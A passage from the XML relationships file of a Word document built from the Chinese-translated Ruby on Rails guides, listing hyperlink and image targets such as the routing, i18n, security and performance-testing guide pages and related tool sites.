Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1037" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1038" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1039" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId356" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId357" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId358" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId359" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId800" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cheat.errtheblog.com/s/rdebug/" TargetMode="External"/><Relationship Id="rId801" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://wiki.rubyonrails.org/rails/pages/HowtoConfigureLogging" TargetMode="External"/><Relationship Id="rId802" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://blog.evanweaver.com/files/doc/fauna/bleak_house/files/README.html" TargetMode="External"/><Relationship Id="rId803" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId804" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId805" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId806" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId807" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId808" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId809" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId680" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId681" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId682" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId683" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId684" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId685" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId686" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId687" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId688" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId689" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId360" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId361" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId362" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId363" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId364" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId365" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId1040" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1041" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1042" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1043" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1044" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1045" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1046" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1047" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1048" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1049" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId366" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId367" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId368" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId369" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId810" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId811" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId812" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId813" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId814" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId815" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId816" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId817" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId818" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId819" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId690" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId691" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId692" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId693" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId694" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId695" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf" TargetMode="External"/><Relationship Id="rId696" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image21.png"/><Relationship Id="rId697" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image22.png"/><Relationship Id="rId698" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId699" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.harmless.com/" TargetMode="External"/><Relationship Id="rId370" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId371" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId372" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId373" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId374" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId375" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId1050" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1051" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1052" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1053" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1054" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1055" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1056" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1057" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1058" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1059" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId376" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId377" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId378" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId379" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId820" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId821" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId822" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId823" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/performance_testing.html" TargetMode="External"/><Relationship Id="rId824" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%80%81%EF%BC%88user" TargetMode="External"/><Relationship Id="rId825" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://kcachegrind.sourceforge.net/html/Home.html" TargetMode="External"/><Relationship Id="rId826" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/String.html" TargetMode="External"/><Relationship Id="rId827" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/wayneeseguin/rvm/tree/master/patches/ruby" TargetMode="External"/><Relationship Id="rId828" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://rvm.beginrescueend.com" TargetMode="External"/><Relationship Id="rId829" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="ftp://ftp.ruby-lang.org/pub/ruby" TargetMode="External"/><Relationship Id="rId500" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId501" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId502" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId503" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId504" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId505" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId506" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId507" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId508" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId509" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId380" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId381" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId382" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId383" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId384" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId385" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId1060" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1061" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1062" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1063" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1064" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1065" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId386" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId387" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId388" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId389" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId1066" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1067" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1068" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1069" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId830" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://github.com/wayneeseguin/rvm/raw/master/patches/ruby/1.9.2/p180/gcdata.patch" TargetMode="External"/><Relationship Id="rId831" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://github.com/wayneeseguin/rvm/raw/master/patches/ruby/1.8.7/ruby187gc.patch" TargetMode="External"/><Relationship Id="rId832" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="git://github.com/wycats/ruby-prof.git" TargetMode="External"/><Relationship Id="rId833" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActiveRecord/Base.html" TargetMode="External"/><Relationship Id="rId834" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActionController/Benchmarking/ClassMethods.html" TargetMode="External"/><Relationship Id="rId835" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActionController/Benchmarking/ClassMethods.html" TargetMode="External"/><Relationship Id="rId836" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://0.0.0.0/items" TargetMode="External"/><Relationship Id="rId837" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://0.0.0.0/items" TargetMode="External"/><Relationship Id="rId838" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.therailsway.com/2009/1/6/requests-per-second" TargetMode="External"/><Relationship Id="rId839" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://rails-analyzer.rubyforge.org" TargetMode="External"/><Relationship Id="rId510" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId511" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId512" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId513" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId514" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId515" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId516" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId517" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId518" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId519" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId390" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId391" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId392" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId393" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId394" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId395" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://weblog.jamisbuck.org/2007/2/5/nesting-resources" TargetMode="External"/><Relationship Id="rId396" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId397" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId398" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/:http:/api.rubyonrails.org/classes/ActionDispatch/Assertions/RoutingAssertions.html" TargetMode="External"/><Relationship Id="rId399" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1070" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1071" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1072" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActiveSupport/Inflector.html" TargetMode="External"/><Relationship Id="rId1073" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://hoohoo.ncsa.uiuc.edu/cgi/cl.html" TargetMode="External"/><Relationship Id="rId1074" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1075" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1076" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1077" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/Rails/Engine.html" TargetMode="External"/><Relationship Id="rId1078" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/Rails/Railtie.html" TargetMode="External"/><Relationship Id="rId1079" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/configuring.html" TargetMode="External"/><Relationship Id="rId840" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.flyingmachinestudios.com/programming/announcing-palmist" TargetMode="External"/><Relationship Id="rId841" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/josevalim/rails-footnotes/tree/master" TargetMode="External"/><Relationship Id="rId842" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/dsboulder/query_reviewer/tree/master" TargetMode="External"/><Relationship Id="rId843" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.hpl.hp.com/research/linux/httperf/" TargetMode="External"/><Relationship Id="rId844" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://httpd.apache.org/docs/2.2/programs/ab.html" TargetMode="External"/><Relationship Id="rId845" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://jakarta.apache.org/jmeter/" TargetMode="External"/><Relationship Id="rId846" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://kcachegrind.sourceforge.net/html/Home.html" TargetMode="External"/><Relationship Id="rId847" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://ruby-prof.rubyforge.org" TargetMode="External"/><Relationship Id="rId848" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://railscasts.com/episodes/98-request-profiling" TargetMode="External"/><Relationship Id="rId849" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.newrelic.com" TargetMode="External"/><Relationship Id="rId520" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId521" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId522" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId523" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId524" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/i18n.html" TargetMode="External"/><Relationship Id="rId525" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" 